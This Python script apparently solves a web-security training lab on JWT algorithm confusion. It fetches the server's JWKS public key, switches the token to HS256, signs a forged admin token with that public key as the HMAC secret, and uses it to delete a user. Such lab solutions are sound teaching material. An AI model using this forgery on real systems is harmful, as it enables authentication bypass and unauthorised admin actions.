import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common import become_admin_payload, delete_carlos, get_session_token, lab_session, public_key_from_jwk, public_key_to_pem_bytes, set_session, sign_hs256

lab = lab_session("JWT authentication bypass via algorithm confusion")
lab.login("wiener", "peter")

jwks = lab.get("/jwks.json").json()
public_key = public_key_from_jwk(jwks["keys"][0])

header, payload = become_admin_payload(get_session_token(lab))
header["alg"] = "HS256"
header.pop("jwk", None)
header.pop("jku", None)
forged = sign_hs256(header, payload, public_key_to_pem_bytes(public_key))

set_session(lab, forged)
delete_carlos(lab)
